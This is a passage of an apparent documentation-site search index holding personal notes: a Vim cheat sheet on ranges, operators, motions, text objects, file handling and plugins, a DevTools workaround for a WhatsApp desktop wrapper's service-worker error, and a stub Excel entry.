flags</p> <p>Ranges:</p> <p><code>%</code> - the entire file  <code>'&lt;,'&gt;</code> - the current selection; the default range while in visual mode  <code>25</code> - line 25  <code>25,50</code> - lines 25-50  <code>$</code> - last line;  can be combined with other lines as in <code>50,$</code> <code>.</code> (or just empty sign) - current line; can be combined with other lines as in <code>.,50</code> (or <code>,50</code>)  <code>,+2</code> or <code>+2,</code> - the current lines and the two lines therebelow  <code>-2,</code> or <code>,-2</code> - the current line and the two lines thereabove </p> <p>Flags:</p> <p><code>g</code> - replace all occurrences on the specified line(or lines selected in visual mode); without this flag just the first occurrence is changed per line  <code>i</code> - ignore case  <code>c</code> - confirm each substitution </p> </li> </ul>"},{"location":"Dev/Soft/Vim/#operators","title":"Operators","text":"<p>Note</p> <p>Operator - operate on the specified range depending on current Vim mode:</p> <ul> <li>normal mode - range is specified by a series of modifiers</li> <li>visual mode - range is the highlighted text</li> </ul> <ul> <li>y - yank : copy</li> <li>d - delete : cut</li> <li>c - change : cut</li> <li>= - format code</li> <li>&gt; / &lt; - un-indent / indent</li> <li>![modifier] {filter} - filter text lines through the external program {filter}  Useful filter programs: <code>sort</code> - e.g. <code>!4jsort</code> will sort the next four lines  <code>tr</code> - e.g. <code>!}tr \"[:lower:]\" \"[:upper:]\"</code> will translate the current paragraph to uppercase  <code>uniq</code> - e.g. <code>!5juniq</code> to ensure the next five lines to be unique </li> <li>g~ - toggle case</li> <li>gq / gw - format the lines / and put the cursor back at the same position in the text; see: <code>:h gq</code>, <code>:h fo</code>(format options), <code>:h fp</code>(format program), <code>:h fo-table</code>(an explanation of the possible options)    tip for useful command: gwip - reflow paragraph</li> <li>zf - manually define a fold(not a editing command, but a view changer)</li> </ul>"},{"location":"Dev/Soft/Vim/#operators-modifiers","title":"Operator's modifiers","text":""},{"location":"Dev/Soft/Vim/#operator-doubling","title":"Operator doubling","text":"<p>double an operator to make it operate on a whole line:</p> <ul> <li>yy - copy current line(no matter where the cursor located in it), including invisible newline sign at the end</li> <li>dd - cut current line(no matter where the cursor located in it), including invisible newline sign at the end</li> <li>cc - cut current line(no matter where the cursor located in it), including invisible newline sign at the end</li> <li>== - format line</li> <li>&gt;&gt; / &lt;&lt; - increase / decrease current line indentation(no matter where the cursor located in it)</li> <li>!! {filter} - filter current line through the external program {filter}</li> <li>gqq / gww - format current line / and put the cursor back at the same position in the text</li> </ul> <p>useful shorthands:</p> <ul> <li>S ( same as cc ) - substitute line</li> </ul>"},{"location":"Dev/Soft/Vim/#motions","title":"Motions","text":"<p>use operators and motions together by following any of these patterns:</p> <ul> <li>{operator}{num}{motion}</li> <li>{num}{operator}{motion}</li> </ul> <p>useful shorthands:</p> <p>Tip</p> <p>When you capitalize a command it performs a stronger (or alternate) version of the original command.</p> <ul> <li> <p>Y ( same as y$ ) - copy from cursor position to end of line </p> </li> <li> <p>D ( same as d$ ) - cut from cursor position to end of line</p> </li> <li>x ( same as dl ) - cut character after the cursor</li> <li> <p>X ( same as dh ) - cut character before the cursor </p> </li> <li> <p>s ( same as cl ) - substitute character :  cut character after the cursor and enter insert mode</p> </li> <li>C ( same as c$ ) - cut from cursor position to end of line and enter insert mode</li> </ul>"},{"location":"Dev/Soft/Vim/#text-objects","title":"Text objects","text":"<p>Text objects are special motions that describe structured pieces of text(the entities of a document domain model), e.g. words, sentences, quoted text, paragraphs, blocks, (HTML) tags, etc.</p> <p>Specify a text object within a command by following this pattern: {operator}{a|i}{text-object}</p> <ul> <li>a (think a or all) - a text object plus surrounding whitespace</li> <li>i (think inner) - inner object without whitespace</li> <li> <p>text-object - one of the built-in text objects:</p> <p><code>w</code> - word  <code>s</code> - sentence  <code>'</code>, <code>\"</code>, <code>`</code> - quotes  <code>p</code> - paragraph  <code>b</code> (or <code>(</code>, <code>)</code>) - block surrounded by ( )  <code>B</code> (or <code>{</code>, <code>}</code>) - block surrounded by { }  <code>&lt;</code>, <code>&gt;</code> - block surrounded by &lt; &gt;  <code>[</code>, <code>]</code> - block surrounded by [ ]  <code>t</code> - tag </p> </li> </ul>"},{"location":"Dev/Soft/Vim/#file-manipulation","title":"File Manipulation","text":""},{"location":"Dev/Soft/Vim/#creating-opening","title":"Creating, opening","text":"<ul> <li><code>:new</code> - new file</li> <li><code>:e {file}</code> - edit {file} in a new buffer</li> <li><code>:e scp://remoteuser@server.tld//absolute/path/to/document</code> or <code>:e scp://remoteuser@server.tld/remoteuser/home/directory/relative/path/to/document</code> - edit remote file via scp</li> <li><code>:sp {file}</code> - open a file in a new buffer and horizontally split window</li> <li><code>:vs {file}</code> - open a file in a new buffer and vertically split window</li> <li>gf / gF - open file under cursor / and jump to the line number following the file name</li> <li>Ctrl+w f / Ctrl+w F - split current window in two + open file under cursor / and jump to the line number following the file name</li> <li>Ctrl+w gf / Ctrl+w gF - open a new tab page + open file under cursor / and jump to the line number following the file name</li> </ul>"},{"location":"Dev/Soft/Vim/#exiting-saving","title":"Exiting, saving","text":"<ul> <li><code>:q</code> / <code>:q!</code> or ZQ - close / force-close a file without saving</li> <li><code>:w</code> - save the current file</li> <li><code>:w !sudo tee %</code> - write out the current file using sudo</li> <li><code>:wq</code> (or <code>:x</code>) / <code>:wq!</code> (or <code>:x!</code>) or ZZ - save and close the current file / force save and close the current file; exits Vim if no open files remain</li> <li><code>:w {newfile}</code> (<code>:{x},{y}w {newfile}</code>) - write the whole ( from line {x} to line {y} ) current buffer into {newfile}, but continue editing the original file; <code>:w! {file}</code> (<code>:{x},{y}w! {file}</code>) to overwrite content of {file} that already exists</li> <li><code>:w &gt;&gt; {file}</code> (<code>:{x},{y}w &gt;&gt; {file}</code>) - append the whole ( from line {x} to line {y} ) current buffer to {file}</li> <li><code>:sav {newname}</code> - save a copy of the current file as {newname} and continue editing the file {newname}</li> </ul>"},{"location":"Dev/Soft/Vim/#vim-tips-tricks","title":"Vim Tips &amp; Tricks","text":""},{"location":"Dev/Soft/Vim/#useful-configs","title":"Useful configs","text":"<ul> <li>Neovim IDE from Scratch - Introduction (100% lua config): , </li> </ul>"},{"location":"Dev/Soft/Vim/#execute-vims-commands-in-a-file-from-the-command-line","title":"Execute Vim's commands in a file from the command line","text":"<p>Use <code>-c</code> flag. You can separate multiple commands with a pipe <code>|</code>. Example:</p> <pre><code>vi -c \"%s/false/true/g|:wq\" file.txt\n</code></pre>"},{"location":"Dev/Soft/Vim/#vim-plugins","title":"Vim Plugins","text":"<ul> <li>Vim Awesome</li> <li>Awesome Neovim </li> </ul>"},{"location":"Dev/Soft/Vim/#floaterm","title":"Floaterm","text":"<p>Commands - </p>"},{"location":"Dev/Soft/Vim/#fzf","title":"Fzf","text":"<p>Ctrl+t , Ctrl+x , Ctrl+v - open file in a new tab, split, vertical split  Commands - </p>"},{"location":"Dev/Soft/Vim/#nerd-commenter","title":"NERD Commenter","text":"<p>Mappings - </p>"},{"location":"Dev/Soft/Vim/#replace-with-register","title":"Replace With Register","text":"<p>[count] [\"x] gr - replace {motion} text with the contents of register x.</p> <p>[count] [\"x] grr - replace [count] lines with the contents of register x.</p> <p>{Visual} [\"x] gr - replace the selection with the contents of register x.</p>"},{"location":"Dev/Soft/Vim/#targets","title":"Targets","text":"<p>Provides additional text objects.</p> <p>Examples -   Cheatsheet - </p>"},{"location":"Dev/Soft/Vim/#vim-argwrap","title":"Vim-argwrap","text":"<p>,r - wrap/unwrap arguments inside of the parenthesis, brackets or curly braces.  Configuration - </p>"},{"location":"Dev/Soft/Vim/#vim-indent-object","title":"Vim-indent-object","text":"<p>Usage - </p>"},{"location":"Dev/Soft/Vim/#vim-textobj-user","title":"Vim-textobj-user","text":"<p>Create your own text objects.</p> <p>Examples - </p>"},{"location":"Dev/Soft/Vim/#vim-unimpaired","title":"Vim Unimpaired","text":""},{"location":"Dev/Soft/Vim/#vim-surround","title":"Vim Surround","text":"<p>Mappings - </p>"},{"location":"Dev/Soft/Vim/#vim-gitgutter","title":"Vim Gitgutter","text":"<p>[c / ]c - jump to previous / next hunk (change)  Leaderhs / Leaderhu - stage / unstage the hunk  Commands - </p>"},{"location":"Dev/Soft/Vim/#vim-fugitive","title":"Vim Fugitive","text":"<p>Commands - </p>"},{"location":"Dev/Soft/Vim/#vimagit","title":"Vimagit","text":"<p>LeaderM - open Magit buffer  Mappings - </p>"},{"location":"Dev/Soft/Vim/#ale-and-cocnvim","title":"ALE and coc.nvim","text":"<p>...to be edited after installation and trying</p>"},{"location":"Dev/Soft/Whatsapp/","title":"Whatsapp","text":""},{"location":"Dev/Soft/Whatsapp/#whatsapp-nativefier","title":"Whatsapp-nativefier","text":"<p>WhatsApp desktop built with nativefier(electron)</p> <p>Installation: AUR, GitHub Releases</p> <p>Solution to \"What's App works with Google Chrome 60+\":</p> <p>Option 1:</p> <p>Pressing Ctrl+Shift+I (on Linux) and the Devtools window will open. Then click on Application -&gt; Service Workers And check the option Bypass for network.</p> <p>Now press Ctrl+R to reload. And Ctrl+Shift+I to close the Devtools.</p> <p>Whenever you open your whatsapp the problem will occur, but since the Bypass for network option has already been enabled, you only need to press Ctrl+Shift+I (open devtools), Ctrl+R (reload), Ctrl+Shift+I (close devtools)</p> <p>Option 2:</p> <p>Pressing ctrl+shift+i (on Linux) and the Devtools window will open. Then pass this line: <code>document.querySelector(\"a[href='https://support.google.com/chrome/answer/95414']\") &amp;&amp; navigator.serviceWorker.getRegistration().then(r =&gt; r.unregister() &amp;&amp; document.location.reload());</code> and hit Enter.</p>"},{"location":"Dev/Soft/Zsh/","title":"Zsh","text":""},{"location":"Dev/Windows/","title":"Windows","text":""},{"location":"Dev/Windows/MsExcel/","title":"MsExcel","text":"<p>Useful Examples:</p> <p> Cell are Buttons</p> <p> Coordination Selecting</p>"}]}